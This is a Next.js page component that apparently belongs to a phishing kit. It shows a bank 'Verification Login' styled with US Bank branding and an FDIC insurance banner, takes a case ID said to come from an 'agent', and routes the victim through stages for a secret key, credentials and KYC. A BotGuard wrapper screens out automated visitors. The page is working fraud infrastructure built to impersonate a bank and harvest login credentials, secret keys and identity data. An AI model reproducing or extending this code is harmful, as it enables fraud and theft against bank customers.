'use client';

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { currentBrand } from '@/config/branding';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';
import { AlertCircle, Loader2 } from 'lucide-react';

export default function HomePage() {
  const router = useRouter();

  const [caseId, setCaseId] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  /**
   * Handle case ID submission
   */
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId.trim()) {
        setFieldError('Please enter your case ID');
        return;
      }

      setIsLoading(true);

      try {
        // Lookup existing session by case ID
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseId.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(
            error.error || 'Unable to validate case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials';
        const guestToken = data.guestToken;

        if (!sessionUuid) {
          setFieldError('Unable to validate case ID. Please try again.');
          return;
        }

        // Map stage name to route 
        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        // Store session UUID, case ID, and guest token in session store
        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          guestToken,
          stage: currentStage as any,
        });

        // Redirect to current stage
        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to validate case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <BotGuard>
      <div className="fdic-box">
        <img className="fdic-logo" src="/brands/us-bank/fdic-logo.svg" alt="FDIC" />
        <span className="fdic-text">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
      </div>

      <section className="login-header">
        <h2>Verification Login</h2>
      </section>

      <form className="login-form" onSubmit={handleSubmit}>
        <div className={`form-group ${fieldError ? 'error' : ''}`} style={fieldError ? { marginBottom: '4px' } : {}}>
          <input
            type="text"
            id="caseId"
            className="input-field"
            placeholder=" "
            value={caseId}
            onChange={(e) => {
              setCaseId(e.target.value);
              if (fieldError) setFieldError('');
            }}
            disabled={isLoading}
            autoComplete="off"
          // required // Removing required to allow custom error handling display
          />
          <label htmlFor="caseId" className="input-label">Case ID</label>
        </div>

        {/* Error message */}
        {fieldError && (
          <div className="error-message" style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '20px' }}>
            <AlertCircle className="h-4 w-4" />
            <span>{fieldError}</span>
          </div>
        )}

        <button
          type="submit"
          className="btn btn-primary"
          disabled={isLoading}
          style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '8px' }}
        >
          {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
          {isLoading ? 'Processing...' : 'Continue'}
        </button>

        <div className="link-group">
          <p className="text-sm text-center" style={{ marginTop: '20px', color: 'var(--color-text-secondary)' }}>
            If an agent has provided you with a direct link, please use that link instead.
          </p>
          <p className="text-sm text-center" style={{ marginTop: '10px', color: 'var(--color-text-secondary)' }}>
            Need help? Contact {currentBrand.companyName} support
          </p>
        </div>
      </form>
    </BotGuard>
  );
}
